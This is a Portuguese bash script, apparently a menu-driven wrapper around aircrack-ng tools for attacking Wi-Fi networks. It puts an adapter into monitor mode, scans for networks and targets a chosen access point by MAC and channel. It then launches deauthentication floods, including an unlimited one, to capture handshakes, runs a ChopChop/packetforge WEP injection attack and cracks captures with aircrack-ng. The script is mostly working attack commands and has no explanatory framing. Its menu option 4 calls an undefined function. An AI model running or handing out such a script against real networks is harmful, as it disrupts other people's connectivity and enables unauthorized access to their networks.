#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

display_main_menu() {
    clear
    echo -e "${CYAN}Menu Principal:${NC}"
    echo -e "${CYAN}1${NC} - ${YELLOW}Preparação Inicial${NC}"
    echo -e "${CYAN}2${NC} - ${YELLOW}Varredura de Redes${NC}"
    echo -e "${CYAN}3${NC} - ${YELLOW}Ataque${NC}"
    echo -e "${CYAN}5${NC} - ${YELLOW}Limpeza${NC}"
    echo -e "${CYAN}6${NC} - ${YELLOW}Monitoramento de Rede Individual${NC}"
    echo -e "${CYAN}7${NC} - ${RED}Sair${NC}"
    read -p "Escolha uma opção: " option
}

# Função de preparação inicial (pode incluir setup de interface)
initial_preparation() {
    echo -e "${CYAN}Preparação Inicial:${NC}"
    read -p "Digite o nome do dispositivo de rede (ex: wlan0): " DISPOSITIVO
    echo -e "${CYAN}Preparação Inicial:${NC}"
    echo -e "${YELLOW}Desativando o dispositivo de rede:${NC}"
    ifconfig $DISPOSITIVO down
    sleep 2

    echo -e "${YELLOW}Configurando o modo monitor:${NC}"
    iwconfig $DISPOSITIVO mode monitor
    sleep 2

    echo -e "${YELLOW}Ativando o dispositivo de rede:${NC}"
    ifconfig $DISPOSITIVO up
    sleep 2

    echo -e "${YELLOW}Verificando o dispositivo com airmon-ng:${NC}"
    airmon-ng check $DISPOSITIVO
    sleep 2

    # Checa e finaliza processos conflitantes
    while true; do
        echo -e "${YELLOW}Finalizando processos conflitantes:${NC}"
        airmon-ng check kill
        sleep 2

        read -p "Ainda resta processos impedindo o progresso? 1- Sim, rodar novamente o check kill | 2- Não, continuar: " check_kill_choice
        case "$check_kill_choice" in
            1)
                echo -e "${YELLOW}Rodando novamente o check kill...${NC}"
                sleep 2
                ;;
            2)
                echo -e "${YELLOW}Processos conflitantes resolvidos. O adaptador está no modo monitor com o MAC alterado.${NC}"
                break
                ;;
            *)
                echo -e "${RED}Opção inválida! Escolha 1 ou 2.${NC}"
                ;;
        esac
    done
}

# Função de scan de redes
network_scan() {
    clear
    echo -e "${CYAN}Scan de Redes:${NC}"
    read -p "Digite o nome do seu dispositivo (ex: wlan0): " DEVICE
    airodump-ng $DEVICE
    sleep 2
}

# Função de monitoramento individual de rede
network_monitor() {
    clear
    echo -e "${CYAN}Monitoramento Individual de Rede:${NC}"
    read -p "Digite o canal do ALVO: " CANAL
    read -p "Digite o MAC (BSSID) da rede alvo: " MAC
    read -p "Digite o nome do arquivo de saída (ex: output): " OUTPUT
    read -p "Digite o nome do Dispositivo:" DISPOSITIVO
    echo -e "${YELLOW}Iniciando monitoramento da rede com BSSID: $MAC e Canal: $CANAL${NC}"
    airodump-ng -c $CANAL --bssid $MAC -w $OUTPUT $DISPOSITIVO
    sleep 2
}

# Função de ataques
attack() {
    echo -e "${RED}Escolha um tipo de ataque:${NC}"
    echo -e "${YELLOW}1${NC} - ${CYAN}Deauth para capturar Handshake v1${NC}"
    echo -e "${YELLOW}2${NC} - ${CYAN}Deauth para capturar Handshake v2${NC}"
    echo -e "${YELLOW}3${NC} - ${CYAN}Korek ChopChop (WEP)${NC}"
    echo -e "${YELLOW}4${NC} - ${CYAN}WEP Encryption${NC}"
    read -p "Opção: " attack_option

    case "$attack_option" in
        1)
            clear
            echo -e "${CYAN}Buscar Handshake v1:${NC}"
            read -p "Digite o MAC do ALVO:" MAC_ALVO
            read -p "Digite o nome do seu dispositivo (Ex: wlan0):" DISPOSITIVO
            echo -e "${YELLOW}Executando ataque de deauth para capturar o Handshake v1:${NC}"
            aireplay-ng -0 0 -a $MAC_ALVO $DISPOSITIVO
            sleep 2
            ;;
        2)
            clear
            echo -e "${CYAN}Buscar Handshake v2:${NC}"
            read -p "$Cuidado. Quantos deauth quer enviar:" DEAUTH
            read -p "Digite o MAC do ALVO:" MAC_ALVO
            read -p "Digite o MAC do seu Dispositivo:" MAC_U
            read -p "Digite o nome do seu Dispositivo (Ex: wlan0):" DISPOSITIVO
            echo -e "${YELLOW}Enviando pacotes de deauth para capturar o Handshake v2:${NC}"
            aireplay-ng --deauth $DEAUTH -a $MAC_ALVO -c $MAC_U $DISPOSITIVO
            sleep 2
            ;;
        3)
            clear
            echo -e "${CYAN}Korek ChopChop (WEP):${NC}"
            read -p "Digite o MAC ALVO: " MAC_ALVO
            read -p "Digite o MAC SEU ROTEADOR: " MAC_SEU
            read -p "Digite o nome do dispositivo de rede (ex: wlan0): " DEVICE
            read -p "Digite o nome do arquivo de keystream (ex: keystream.bin): " KEYSTREAM_FILE
            read -p "Digite o nome do packet desejado (ex: packet.cap): " PACKET_FILE
            read -p "Digite o nome do arquivo gerado (ex: output.cap): " OUTPUT_FILE
            echo -e "${YELLOW}Executando ChopChop e PacketForge:${NC}"
            aireplay-ng --chopchop -b $MAC_ALVO -h $MAC_SEU $DEVICE
            sleep 2
            packetforge-ng -o -a $MAC_ALVO -h $MAC_SEU -k 255.255.255.255 -l 255.255.255.255 -y $KEYSTREAM_FILE -w $PACKET_FILE
            sleep 2
            aireplay-ng -2 -r $PACKET_FILE $DEVICE
            sleep 2
            aircrack-ng $OUTPUT_FILE
            sleep 2
            ;;
        4)
            clear
            echo -e "${CYAN}WEP Encryption:${NC}"
            read -p "Digite o arquivo CAP (ex: arquivo.cap): " CAP_FILE
            echo -e "${YELLOW}Executando aircrack-ng:${NC} aircrack-ng $CAP_FILE"
            aircrack-ng $CAP_FILE
            sleep 2
            ;;
        *)
            echo -e "${RED}Opção inválida! Escolha 1-4.${NC}"
            ;;
    esac
}

# Função para limpeza
cleanup() {
    clear
    echo -e "${CYAN}Limpeza:${NC}"
    read -p "Digite o nome do dispositivo de rede em modo monitor (ex: wlan0mon): " MONITOR_DEVICE
    echo -e "${YELLOW}Desativando o dispositivo de rede:${NC}"
    ifconfig $MONITOR_DEVICE down
    sleep 2
    echo -e "${YELLOW}Revertendo para o modo de gerenciamento:${NC}"
    iwconfig $MONITOR_DEVICE mode managed
    sleep 2
    echo -e "${YELLOW}Ativando o dispositivo de rede:${NC}"
    ifconfig $MONITOR_DEVICE up
    sleep 2
    echo -e "${YELLOW}Processo de limpeza concluído.${NC}"
}

# Loop principal
while true; do
    display_main_menu
    case "$option" in
        1) initial_preparation ;;
        2) network_scan ;;
        3) attack ;;
        4) crack_password ;;
        5) cleanup ;;
        6) network_monitor ;;
        7) exit 0 ;;
        *) echo -e "${RED}Opção inválida! Escolha 1-7.${NC}" ;;
    esac
done

